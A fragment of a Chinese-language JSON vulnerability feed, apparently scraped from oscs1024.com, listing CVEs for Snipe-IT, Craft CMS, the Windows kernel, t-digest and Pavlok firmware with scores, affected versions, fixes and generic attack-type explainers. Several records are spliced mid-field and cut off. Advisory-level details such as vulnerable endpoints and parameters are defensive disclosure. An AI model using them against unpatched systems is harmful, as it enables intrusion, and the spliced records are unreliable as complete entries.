压力测试与性能优化：应用程序应该进行压力测试，以评估其在高负载情况下的性能，并进行必要的性能优化，以确保能够有效地处理大量请求而不耗尽资源。", "title": "如何预防拒绝服务"}], "cnvd_id": "", "cve_id": "CVE-2026-86734", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H", "severity": "medium", "base_score": 6.5}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.1}]}, "cvss_score": 7.1, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-400", "description": "Snipe-IT 是基于 Laravel 的开源 IT 资产与许可证管理系统，用于资产签收、签出、库存与许可证管理。\n受影响版本中，已认证用户向 POST /account/accept/{acceptance} 提交未限制长度的 note 后，AcceptanceController::store() 会把该值写入通知数据，并在默认 sync 队列下同步进入 AcceptanceItemDeclinedNotification::toMail() 的 markdown() 渲染；该路径使用存在资源消耗问题的 league/commonmark 2.8.2，超长备注会占用 PHP worker CPU 并导致拒绝服务。\n修复版本中通过在 store() 对 note 增加 nullable|string|max:1000 服务端校验，并在 composer.json 中直接要求 league/commonmark ^2.9.0（composer.lock 钉选 2.10.0），阻止超长备注进入同步 Markdown 解析，消除该拒绝服务路径。", "effects": [{"comp_name": "snipe/snipe-it", "ecosystem": "composer", "versions": [{"affected_ title": "授权检查缺失常见的攻击方式"}, {"content": "- 使用身份验证和授权机制：程序应该使用适当的身份验证和授权机制来验证用户的身份和权限，以确保只有授权用户可以访问受保护的资源或数据。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查缺失"}], "cnvd_id": "", "cve_id": "CVE-2026-86765", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N", "severity": "medium", "base_score": 6.5}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.1}]}, "cvss_score": 7.1, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-862", "description": "当分配字段提交到资产更新端点时，8.7.0 之前的 Snipe-IT 版本无法强制执行结帐授权。具有编辑权限但明确拒绝签出权限的经过身份验证的用户可以通过向 PATCH /api/v1/hardware/{id} 提交分配的_用户、分配的_资产或分配的_位置参数来重新分配资产、绕过签入程序以及更改保管记录。", "effects": [{"comp_name": "snipe-it", "ecosystem": "linux", "versions": [{"affected_version": "[8.6.3,8.7.0)", "min_fixed_version": "8.7.0", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "授权检查缺失", "kind_en": "缺少授权", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-8p3t-649n", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-8p3t-649n", "name": "https://www.oscs1024.com/hd/MPS-8p3t-649n"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86765", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86765"}, {"url": "https://gith MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.1}]}, "cvss_score": 7.1, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-862", "description": "Craft CMS 是开源内容管理系统，源码托管于 GitHub，用于构建网站并管理内容与用户账户。\n受影响版本中，UsersController::actionActivateUser 处理控制面板 POST 请求 users/activate-user 时只调用 requirePermission('administrateUsers')，未在目标用户为管理员时执行 requireAdmin()。持有 administrateUsers 权限的非管理员已认证用户可以把请求体 userId 指向 pending 或被停用的管理员账户，随后 Craft::$app-\u003egetUsers()-\u003eactivateUser($user) 会激活该账户，再结合重置该账户密码可造成权限提升。\n修复版本中通过在 actionActivateUser 解析目标用户后增加 if ($user-\u003eadmin) { $this-\u003erequireAdmin(false); } 检查，与 actionDeactivateUser 对齐，阻止非管理员激活管理员账户。", "effects": [{"comp_name": "craftcms/cms", "ecosystem": "composer", "versions": [{"affected_version": "[5.0.0-RC1,5.10.12)", "min_fixed_version": "5.10.12", "repository": "composer", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "授权检查缺失", "kind_en": "缺少授权", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-gtac-9bku", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-gtac-9bku", "name": "https://www.oscs1024.com/hd/MPS-gtac-9bku"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86731", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86731"}, {"url": "https://github.com/craftcms/cms/security/advisories/GHSA-jqf5-vfg6-8cx5", "name": "GitHub Security Advisory (GHSA-jqf5-vfg6-8cx5)"}, {"url": "https://www.vulncheck.com/advisories/craft-cms-5.0.0-rc1-before-5.10.12-permission-escalation-via-userscontroller", "name": "VulnCheck Advisory: Craft CMS 5.0.0-RC1 before 5.10.12 Permission Escalation via UsersController"}], "scope_influence": "", "tags": ["php", "开源"], "title": "Craft CMS权限提升漏洞", "_translated": true, "_saved_at": "2026-09-08T16:59:22+00:00", "_first_saved_at": "2026-09-08T16:59:22+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-gtac-9bku"}, {"analysis_status": 0, "articles": [{"content": "应用程序使用已释放的内存区域。当一个对象被释放后，程序可能继续引用该内存地址，导致使用了无效的内存。攻击者可以利用这个漏洞，通过修改已释放的内存内容来执行恶意代码或者获取敏感信息。", "title": "什么是UAF"}, {"content": "- 悬空指针攻击：攻击者利用程序中的已释放指针，重新分配内存并故意将指针指向已释放的内存区域。然后，当程序继续使用该指针时，攻击者可以执行恶意代码或者篡改内存数据。\r\n- 虚函数表劫持：针对面向对象的程序，攻击者可以通过修改已释放对象的虚函数表（VTable）指针，来改变程序的行为。攻击者可以控制程序执行任意代码或者调用任意函数。\r\n- 堆喷射：攻击者通过大量分配和释放特定大小的内存块，以创建特定的内存布局。然后，攻击者可以利用UAF漏洞来操作特定的内存块，例如修改函数指针，从而实现代码执行。", "title": "UAF常见的攻击方式"}, {"content": "- 释放后置空指针：在释放内存后，立即将指针置为空，防止后续误用。\r\n- 使用析构函数：在对象被释放时，使用析构函数来清理相关资源，避免UAF漏洞的发生。\r\n- 使用引用计数或垃圾回收机制：引入引用计数或垃圾回收机制可以自动处理内存释放，减少UAF的发生。\r\n- 使用现代化的编程语言和框架：现代编程语言和框架通常具有内存管理机制，如自动内存回收和强类型检查，可以有效减少UAF漏洞的发生。\r\n- 定期更新和修复：及时更新和修复软件，包括操作系统、应用程序和库文件，以防止已知的UAF漏洞被攻击利用。", "title": "如何预防UAF"}], "cnvd_id": "", "cve_id": "CVE-2026-85360", "cvss": {"cvssv31": [{"source": "secure@microsoft.com", "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7}]}, "cvss_score": 7, "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-416", "description": "Windows 内核中的释放后使用允许授权攻击者在本地提升权限。", "effects": [{"comp_name": "windows_10_1607", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.14393.0,10.0.14393.9512)", "min_fixed_version": "10.0.14393.9512", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_10_1809", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.17763.0,10.0.17763.9245)", "min_fixed_version": "10.0.17763.9245", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_10_21H2", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.19044.0,10.0.19044.7725)", "min_fixed_version": "10.0.19044.7725", "repos xSite CMS 通过 109.6 通过 ajax 调度程序包含本地文件", "_translated": true, "_saved_at": "2026-09-09T21:27:44+00:00", "_first_saved_at": "2026-09-09T18:22:30+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-cmk6-z59e"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-87962", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "severity": "high", "base_score": 7.5}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.7}]}, "cvss_score": 8.7, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-1284", "description": "t-digest 是一个 Apache-2.0 开源的 Java 分位数估算库（Maven 坐标 com.tdunning:t-digest），用于在线近似计算分位数等基于秩的统计量并支持序列化合并，被 Apache Pinot 等数据系统用作预聚合数据结构。\n受影响版本中，MergingDigest.fromBytes 从序列化字节流读取 compression、n、bufferSize、lastUsedCell 等头字段时未做任何校验：VERBOSE_ENCODING 路径将未校验的 n 直接用作 weight/mean 数组的循环写入边界，而数组容量仅由 compression 决定，n 超过容量时抛出 ArrayIndexOutOfBoundsException；compression 取超大值时构造函数容量计算发生整型回绕，抛出 NegativeArraySizeException 或 OutOfMemoryError；SMALL_ENCODING 路径的 lastUsedCell 未与数组容量及缓冲区剩余长度交叉校验，同样导致越界或 BufferUnderflowException。攻击者向反序列化入口投递畸形序列化摘要即可中断解析线程，造成拒绝服务。\n修复版本中通过，可通过避免反序列化不可信来源的 t-digest 字节数据，或在调用反序列化入口前自行校验上述头字段进行缓解（下游 Apache Pinot 已在 PR #19015 中新增 TDigestUtils.validateSerialized 防护）；上游已在 issue #227 与 PR #228 中提出校验方案，截至 2026-09-10 尚未合并发布修复版本。", "effects": [{"comp_name": "com.tdunning:t-digest", "ecosystem": "maven", "versions": [{"affected_version": "[3.1,3.3]", "min_fixed_version": "", "repository": "maven", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "输入中指定数量的验证不当", "kind_en": "输入中指定数量的验证不正确", "last_modified_time": "2026-09-10", "level": "High", "mps_id": "MPS-t0zj-k8ay", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-t0zj-k8ay", "name": "https://www.oscs1024.com/hd/MPS-t0zj-k8ay"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-87962", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-87962"}, {"url": "https://github.com/tdunning/t-digest/issues/227", "name": "GitHub Issue #227"}, {"url": "https://github.com/tdunning/t-digest/blob/7905f3d2ad18e7d7176811147d1316a3e23d7061/core/src/main/java/com/tdunning/math/stats/MergingDigest.java", "name": "MergingDigest.java"}, {"url": "https://github.com/tdunning/t-digest", "name": ""}, {"url": "https://www.vulncheck.com/advisories/t-digest-3.1-through-3.3-denial-of-service-via-unvalidated-length-fields-in-mergingdigest-frombytes", "name": "VulnCheck Advisory: t-digest 3.1 through 3.3 Denial of Service via Unvalidated Length Fields in MergingDigest.fromBytes"}], "scope_influence": "", "tags": [], "title": "t-digest 反序列化拒绝服务漏洞", "_translated": true, "_saved_at": "2026-09-10T12:37:05+00:00", "_first_saved_at": "2026-09-10T12:37:05+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-t0zj-k8ay"}, {"analysis_status": 0, "articles": [{"content": "- 攻击者通过构造恶意的数据，将过多的数据输入到程序的缓冲区中，使得缓冲区的空间被填满，从而溢出到程序的栈 (stack) 或堆 (heap) 中，导致程序崩溃、拒绝服务、数据泄露等安全问题。\n", "title": "什么是经典缓冲区溢出"}, {"content": "| 类型        | 描述                                                         |\n| ----------- | ------------------------------------------------------------ |\n| 代码注入攻击      | 攻击者通过向程序的缓冲区输入恶意代码，从而控制程序执行流程，实现对程序操作的恶意操作。例如，攻击者可以通过向 Web 应用程序的输入框中输入恶意代码，从而执行任意的代码，破坏系统、窃取数据等。 |\n| 数据覆盖攻击      | 攻击者通过向程序的缓冲区输入过多的数据，从而覆盖程序中的重要数据或代码，实现对程序操作的恶意操作。例如，攻击者可以通过向聊天应用程序的输入框中输入过多的表情符号，从而覆盖程序中的重要数据，例如聊天消息、账号密码等。 |\n| 栈溢出攻击 | 攻击者通过向程序的栈中输入过多的数据，从而溢出到栈外部，实现对程序操作的恶意操作。例如，攻击者可以通过向游戏应用程序的输入框中输入过多的道具名称，从而覆盖程序中的重要数据，例如游戏数据、账号密码等。 |\n| 堆溢出攻击       | 攻击者通过向程序的堆中输入过多的数据，从而溢出到堆外部，实现对程序操作的恶意操作。例如，攻击者可以通过向操作系统工具的输入框中输入过多的命令，从而覆盖程序中的重要数据，例如系统文件、配置文件等。 |", "title": "经典缓冲区溢出常见的攻击方式"}, {"content": "- 输入验证：在程序输入处对输入数据进行严格的验证和过滤，确保输入数据符合预期的格式和类型，避免被攻击者注入恶意命令或数据。可以使用正则表达式、格式字符串等方式进行输入验证。\n- 输出过滤：在程序输出处对输出数据进行严格的过滤和检查，确保输出数据符合预期的格式和类型，避免被攻击者截获和篡改。可以使用安全的输出过滤库等方式进行输出过滤。\n- 使用安全的编程模型：使用安全的编程模型，例如避免使用原生的缓冲区管理函数，使用安全的框架和库来处理输入数据和执行命令，避免缓冲区溢出漏洞。\n- 数据库加密和访问控制：对于敏感数据和命令，使用加密和访问控制措施，确保只有授权用户可以访问和执行命令，避免被攻击者窃取和篡改。\n- 定期更新和升级：定期更新和升级应用程序和库的版本，确保应用程序和库的最新版本包含了最新的安全补丁和修复措施，避免安全漏洞的出现和利用。\n- 安全审计和监控：定期对系统和应用程序进行安全审计和监控，及时发现和阻止潜在的安全漏洞和攻击，确保系统和数据的安全和可靠性。", "title": "如何预防经典缓冲区溢出"}], "cnvd_id": "", "cve_id": "CVE-2026-87931", "cvss": {"cvssv2": [{"source": "cna@vuldb.com", "vector": "AV:A/AC:L/Au:N/C:C/I:C/A:C", "severity": "high", "base_score": 8.3}], "cvssv3": [{"source": "VulDB", "vector": "CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:X/RC:R", "severity": "critical", "base_score": 9.6}], "cvssv31": [{"source": "cna@vuldb.com", "vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "severity": "critical", "base_score": 9.6}], "cvssv4": [{"source": "cna@vuldb.com", "vector": "CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.6}]}, "cvss_score": 8.6, "cvss_vector": "CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-120", "description": "Pavlok Behavioral Conditioning Wearable 是 Behavioral Technology Group 推出的行为条件训练智能手环，固件闭源，通过低功耗蓝牙（BLE）与移动应用配对，提供振动、声音与电击等习惯纠正提示。\n受影响版本中，固件的 Apple Notification Center Service（ANCS）事件处理组件在处理通知事件数据时未正确校验数据长度，向缓冲区写入超出边界的内容引发缓冲区溢出；攻击者需处于设备邻近网络（蓝牙通信范围）内，无需用户交互与权限，通过构造的通知事件数据触发溢出，官方 CVSS 评分预期可导致设备机密性、完整性与可用性受损，且影响范围可能超出易受攻击组件本身。\n修复版本中
